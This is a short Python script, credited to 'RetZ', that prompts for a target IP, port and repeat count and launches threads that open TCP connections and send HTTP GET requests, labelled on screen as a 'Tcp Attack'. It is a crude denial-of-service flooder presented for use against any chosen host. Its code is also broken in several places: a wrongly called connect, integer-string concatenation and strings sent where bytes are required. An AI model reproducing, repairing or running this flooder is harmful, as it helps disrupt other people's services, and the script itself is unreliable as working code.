import socket, threading

print('Credit By RetZ.')
ip = str(input('Ip: '))
port = int(input('Port: '))
times = int(input('Times: '))

def tcp():
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect(ip, port)
  s.send("GET /" + port + " HTTP/1.1\r\n")
  s.send("Host: " + ip + "\r\n\r\n");
  print("\033[1;36;40mTcp Attack To IP", ip, "PORT", port)
  s.close

for i in range(1, times):
  th = threading.Thread(target = tcp)
  th.start()
